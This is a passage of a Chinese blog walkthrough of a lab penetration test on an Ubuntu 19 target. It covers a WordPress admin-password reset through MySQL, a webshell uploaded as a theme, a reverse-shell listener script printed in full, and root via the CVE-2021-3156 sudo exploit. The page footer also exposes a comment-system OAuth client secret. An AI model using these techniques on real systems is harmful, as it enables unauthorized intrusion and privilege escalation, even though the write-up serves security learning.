+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315104645.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315104645353"></p>
+<p>那么开启一个简单的 <strong>socks5</strong> 吧。先设置一个自动路由：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315104751.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315104750901"></p>
+<p>之后直接开启 <strong>socks5</strong> 代理：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315104849.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315104849756"></p>
+<p>此时，就可以使用 <strong>代理链</strong> 或者其他代理方式进行操作了。比如这里使用最简单的 <strong>firefox</strong> 浏览器使用该代理去访问。先简单的用 <strong>FoxyProxy</strong> 插件去设置一下代理：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315105039.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315105039705"></p>
+<p>那么可以简单验证一下该代理是否已经被开启了，比如尝试访问一下 <strong>靶机</strong> 的另一个IP <strong>172.16.243.220</strong> 。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110004.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110003844"></p>
+<p>那么不妨再简单的看如何从 <strong>redis</strong> 用户逃逸出来，比如想办法拿一个 <strong>webshell</strong> 即把用户从 <strong>redis</strong> 逃逸成 <strong>www-data</strong> 用户了。</p>
+<h4 id="获取-webshell">- 获取 webshell -</h4>
+<p>首先，看一下网络目录，为 <code>/var/www/web</code></p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110247.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110247188"></p>
+<p>但是咱们显然是没有直接的写权限的：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110343.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110343724"></p>
+<p>虽然没有写权限，但有读权限，并且可以看到是存在一个 <strong>wordpress</strong> 的玩意，不如去读一下配置。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110520.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110519984"></p>
+<p>从这里可以看到是存在一个本地的 <strong>mysql</strong> 服务器，只是没有对外开放而已，并且还得到了 <strong>登录用户</strong> 和 <strong>登录密码</strong> 。那么不如可以去修改 <strong>wordpress</strong> 后台管理员用户密码然后从 <strong>wordpress</strong> 的后台 <strong>getshell</strong> 。 先尝试登录一下 <strong>mysql</strong> ，这里是成功从本地登录上了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110755.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110755901"></p>
+<p>然后可以看一下后台管理员的用户和密码：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315110906.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315110906372"></p>
+<p>显然，管理员的用户名是 <strong>morouu</strong> 了，只是这个密码的 <strong>hash</strong> 用的是 <strong>wordpress</strong> 自己的加密方式加密的，简单说来即是 <strong>md5(salt + 密码明文)</strong>  很多次再使用变种的 <strong>base64</strong> 存储。其中 <strong>$P</strong> 为前缀，不需要看，而从 后一个 <strong>$</strong> 开始，前 <strong>8</strong> 位为 <strong>salt</strong> ，后 <strong>22</strong> 位为 <strong>密码hash</strong> 经过变种 <strong>base64</strong> 编码后得到的值。由于是 <strong>md5(salt + 密码明文)</strong> 很多次，不太可能破解出来了。</p>
+<p>不过实际上 <strong>wordpress</strong> 为了能够方便当用户忘记密码时能够找回密码，是允许用户将 <strong>md5(密码明文)</strong> 覆盖回原来的 <strong>密码hash</strong> 登录的。当用上述方式登录后，<strong>md5(密码明文)</strong> 就会被 <strong>wordpress</strong> 处理变为使用 <strong>wordpress</strong> 的加密方式的 <strong>密码hash</strong> 了。这虽说看起来有点不太安全，当然也是理想情况下吧，毕竟攻击者能有数据库操作权限确实是几乎不可能的了。</p>
+<p>那么这里既然拥有了数据库操作权限，那就可以利用这个方式去重置后台管理员密码了。首先简单生成一个 <strong>md5</strong> 值作为登录密码：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315112121.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315112121140"></p>
+<p>然后从数据库去 <strong>update</strong> 一下管理员用户：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315112300.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315112259992"></p>
+<p>然后尝试从代理页面去登录：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315112410.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315112410708"></p>
+<p>OK，成功登上去了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315112443.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315112443442"></p>
+<p>至于 <strong>wordpress</strong> 的后台 <strong>getshell</strong> 实际上是非常简单的，比如说可以从官网上下一个 <strong>wordpress</strong> 的主题文件，然后把 <strong>[一句话]</strong> 文件给放进去：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315112605.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315112605440"></p>
+<p>再到 <strong>wordpress</strong> 后台的主题添加页面，将刚刚处理好的主题给上传了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113125.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113125728"></p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113140.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
+<p>当出现以下页面时，说明主题安装成功：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113258.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113258127"></p>
+<p>此时只需要访问 <code>http://172.16.243.220/wordpress/wp-content/themes/[主题名称]/dm.php</code> 就能访问到刚刚的 <strong>[一句话]</strong> 了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113400.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113400184"></p>
+<p>只是从 <strong>phpinfo</strong> 里面可以看出，系统函数都给 <strong>ban</strong> 了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114322.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
+<p>遇事不决，直接上 <strong>甜甜圈</strong> 好了，直接 <code>python3 -m pip install doughnuts &amp;&amp; python3 -m doughnuts.install [命令名] </code>，比如我这里为：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113715.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113715075"></p>
+<p>然后输入 <code>dh</code> 即可开启。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315113749.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315113749519"></p>
+<p>那么直接命令操作吧，先挂代理，然后连接 <strong>[一句话]</strong> ：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114417.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114417581"></p>
+<p>这里确实是没有可以执行的系统函数了，那么尝试将其给 <strong>bypass</strong> 试试：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114512.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114512863"></p>
+<p>显然是成功了！那么可以使用 <strong>伪完整交互式shell</strong> 接收脚本去接收一个反弹shell吧，这里先上脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error, socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR</span><br><span class="line"><span class="keyword">from</span> termios <span class="keyword">import</span> tcgetattr, tcsetattr, TCSADRAIN</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdin, stdout, version_info, argv</span><br><span class="line"><span class="keyword">from</span> tty <span class="keyword">import</span> setraw</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system, _exit</span><br><span class="line"></span><br><span class="line"><span class="comment"># import thread, deal with byte</span></span><br><span class="line"><span class="keyword">if</span> (version_info.major == <span class="number">2</span>):</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_byte</span>(<span class="params"> s, encoding = <span class="string">&quot;UTF-8&quot;</span> </span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytearray</span>(s, encoding))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    STDOUT = stdout</span><br><span class="line">    <span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_byte</span>(<span class="params"> s, encoding = <span class="string">&quot;UTF-8&quot;</span> </span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(s, encoding = encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    STDOUT = stdout.buffer</span><br><span class="line">    <span class="keyword">import</span> _thread <span class="keyword">as</span> thread</span><br><span class="line"></span><br><span class="line">FD = <span class="literal">None</span></span><br><span class="line">OLD_SETTINGS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_GetchUnix</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params"> self </span>):</span></span><br><span class="line">        <span class="keyword">global</span> FD, OLD_SETTINGS</span><br><span class="line">        FD = stdin.fileno( )</span><br><span class="line">        OLD_SETTINGS = tcgetattr(FD)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            setraw(stdin.fileno( ))</span><br><span class="line">            ch = stdin.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getch = _GetchUnix( )</span><br><span class="line"></span><br><span class="line">CONN_ONLINE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stdprint</span>(<span class="params"> message </span>):</span></span><br><span class="line">    stdout.write(message)</span><br><span class="line">    stdout.flush( )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_socket</span>(<span class="params"> talk, exit_code = <span class="number">0</span> </span>):</span></span><br><span class="line">    <span class="keyword">global</span> FD, OLD_SETTINGS, CONN_ONLINE</span><br><span class="line">    CONN_ONLINE = <span class="number">0</span></span><br><span class="line">    talk.close( )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tcsetattr(FD, TCSADRAIN, OLD_SETTINGS)</span><br><span class="line">    <span class="keyword">except</span> TypeError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    system(<span class="string">&quot;reset&quot;</span>)</span><br><span class="line">    _exit(exit_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_daemon</span>(<span class="params"> conn </span>):</span></span><br><span class="line">    <span class="keyword">global</span> CONN_ONLINE</span><br><span class="line">    <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp = conn.recv(<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> (tmp):</span><br><span class="line">                STDOUT.write(tmp)</span><br><span class="line">                stdout.flush( )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> error</span><br><span class="line">        <span class="keyword">except</span> error:</span><br><span class="line">            msg = <span class="string">&quot;Connection close by socket.\n&quot;</span></span><br><span class="line">            stdprint(msg)</span><br><span class="line">            close_socket(conn, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params"> port </span>):</span></span><br><span class="line">    conn = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    conn.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    conn.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">    conn.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        talk, addr = conn.accept( )</span><br><span class="line">        stdprint(<span class="string">&quot;Connect from %s.\n&quot;</span> % addr[ <span class="number">0</span> ])</span><br><span class="line">        thread.start_new_thread(recv_daemon, (talk,))</span><br><span class="line">        talk.send(get_byte(<span class="string">&quot;&quot;&quot;python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;\n&quot;&quot;&quot;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        talk.send(get_byte(<span class="string">&quot;&quot;&quot;clear\n&quot;&quot;&quot;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> CONN_ONLINE:</span><br><span class="line">            c = getch( )</span><br><span class="line">            <span class="keyword">if</span> c:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    talk.send(get_byte(c, encoding = <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> error:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># stdprint(&quot;Connection close by KeyboardInterrupt.\n&quot;)</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        stdprint(<span class="string">&quot;Connection close...\n&quot;</span>)</span><br><span class="line">        close_socket(conn, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(argv) &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;      python %s [port]&quot;</span> % path.basename(argv[ <span class="number">0</span> ]))</span><br><span class="line">        exit(<span class="number">2</span>)</span><br><span class="line">    main(<span class="built_in">int</span>(argv[ <span class="number">1</span> ]))</span><br></pre></td></tr></table></figure>
+<p>这里先运行脚本进行监听，然后使用 <strong>甜甜圈</strong> 弹个shell：<br>
+<img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114846.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114846324"></p>
+<p>OK，这里是成功了，不妨 <code>ls /tmp</code> 试试：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315114939.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315114938968"></p>
+<p>成功逃逸了，那么下一步即可以是提权了。</p>
+<h4 id="CVE权限提升">- CVE权限提升 -</h4>
+<p>先看一下当前 <strong>靶机</strong> 的信息吧：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315115122.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315115122264"></p>
+<p>这是一个 <strong>ubuntu19</strong> 的系统，此时可以想到 <strong>CVE2021-3156</strong> 即 <strong>sudo权限提升漏洞</strong> 。可以检查以下 <strong>sudo</strong> 的版本：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315115628.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315115628741"></p>
+<p>显然是可以的了，那么就利用一下 <strong>exp</strong> 直接提权吧 <a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">exp地址</a> ，将其下载打包成 <strong>.zip</strong> 后直接开服务器 <strong>wget</strong> 啥的或者用 <strong>甜甜圈</strong> 上传都行：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120204.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120204170"></p>
+<p>但是这里出现了一个小问题，似乎是找不到 <strong>cc1</strong> 这个玩意：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120246.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120246554"></p>
+<p>直接用 <strong>find</strong> 先把 <strong>cc1</strong> 给找到了，</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120330.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120330155"></p>
+<p>然后加到环境变量里边即可，</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120418.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120418037"></p>
+<p>之后直接运行 <code>./sudo-hax-me-a-sandwich 0</code> 就能得到 <strong>root</strong> 权限了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120500.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120500120"></p>
+<p>此时可以用该权限去运行上边生成的 <strong>msf木马</strong> ：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210315120730.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210315120730897"></p>
+<p>那么就拿下了 <strong>ubuntu19</strong> ，emmm还有个小彩蛋。</p>
+<hr>
+<h2 id="总结">- 总结 -</h2>
+<p>咋说呢，说起来 <strong>redis</strong> 外网泄露确实是很不安全的，这可不能够忽视啊。同时关于对 <strong>redis</strong> 用户逃逸，确实是还蛮巧妙的，哈哈哈。</p>
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          <li class="previous">
+            <a href="/1756077890/" data-toggle="tooltip" data-placement="top" title="说明 - socat的简单使用">&larr; Previous Post</a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      如果您喜欢此博客或发现它对您有用，则欢迎对此发表评论。也欢迎您共享此博客，以便更多人可以参与。如果博客中使用的图像侵犯了您的版权，请与作者联系以将其删除。谢谢 ！
+    
+  </p>
+</div>
+<!-- tip end -->
+
+        <!-- tip end -->
+        
+
+        
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=练习 - Ubuntu19渗透&body=Hi,I found this website and thought you might like it https://morblog.cc/4258246850/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
+        
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+  <!-- gitment start -->
+  <!-- Docs:https://github.com/imsun/gitment -->
+
+  <div id="blog_comments"></div>
+  <!-- <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"> <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script> -->
+
+  <script src="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/gitment.browser.js"></script>
+
+  <script>
+    const myTheme = {
+      render(state, instance) {
+        const container = document.createElement('div')
+        container.lang = "en-US"
+        container.className = 'gitment-container gitment-root-container'
+
+        // your custom component
+        container.appendChild(instance.renderSomething(state, instance))
+        container.appendChild(instance.renderHeader(state, instance))
+        container.appendChild(instance.renderEditor(state, instance))
+        container.appendChild(instance.renderComments(state, instance))
+        container.appendChild(instance.renderFooter(state, instance))
+        return container
+      },
+      renderSomething(state, instance) {
+        const container = document.createElement('div')
+        container.lang = "en-US"
+        container.className = 'hello_visitor'
+        if (state.user.login) {
+          container.innerText = `Hello ${state.user.login}, Welcome to comment system`
+        }
+        return container
+      }
+    }
+
+    const gitment = new Gitment({
+      id: 'Mon Dec 27 2021 12:12:23 GMT+0800', // optional
+      owner: 'MorouU',
+      repo: 'morcomment',
+      oauth: {
+        client_id: '1312dc4ff4d6834bb0f6',
+        client_secret: '07aa0dc79f38ac6fafea3914a40558f250e7cfb4',
+		// redirect_uri: 'https://morblog.cc/'
+      },
+      desc: '',
+      perPage: '15',
+      maxCommentHeight: '250',
+      theme: myTheme,
+      // ... For more available options, check out the documentation below
+    })
+
+    gitment.render('blog_comments')
+    // or gitment.render(document.getElementById('comments')) or document.body.appendChild(gitment.render())
+  </script>
+
+  <!-- gitment end -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">目录</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">练习 - Ubuntu19渗透</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%9B%AE%E6%A0%87%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">- 目标配置 -</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">- 具体步骤 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-getshell"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">- 信息搜集 &amp; getshell -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21%E7%AB%AF%E5%8F%A3-ftp"><span class="toc-nav-number">1.2.1.1.</span> <span class="toc-nav-text">- 21端口 (ftp) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22%E7%AB%AF%E5%8F%A3-ssh"><span class="toc-nav-number">1.2.1.2.</span> <span class="toc-nav-text">- 22端口 (ssh) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#80%E7%AB%AF%E5%8F%A3-http"><span class="toc-nav-number">1.2.1.3.</span> <span class="toc-nav-text">- 80端口 (http) -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#6379%E7%AB%AF%E5%8F%A3-getshell-redis"><span class="toc-nav-number">1.2.1.4.</span> <span class="toc-nav-text">- 6379端口 &amp; getshell (redis) -</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">- 横向移动 &amp; 权限提升 -</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#msf-%E8%8E%B7%E5%8F%96-metershell"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">- msf 获取 metershell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">- 开启代理 -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%8E%B7%E5%8F%96-webshell"><span class="toc-nav-number">1.2.2.3.</span> <span class="toc-nav-text">- 获取 webshell -</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-nav-number">1.2.2.4.</span> <span class="toc-nav-text">- CVE权限提升 -</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">- 总结 -</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">标签</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#安全" title="安全">安全</a>
+            
+            <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
+            
+            <a class="tag" href="/tags/#渗透" title="渗透">渗透</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>朋友们</h5>
+        <ul class="list-inline">
+
+          
+          <li>
+            <a href="https://www.cnblogs.com/Yhck/" target="_blank">Yhck</a>
+          </li>
+          
+          <li>
+            <a href="https://www.cnblogs.com/wkzb/" target="_blank">beiwo</a>
+          </li>
+          
+          <li>
+            <a href="https://leohearts.com/" target="_blank">Leohearts</a>
+          </li>
+          
+          <li>
+            <a href="https://longlone.best/" target="_blank">Longlone</a>
+          </li>
+          
+          <li>
+            <a href="http://na0hblog.top/" target="_blank">Na0h</a>
+          </li>
+          
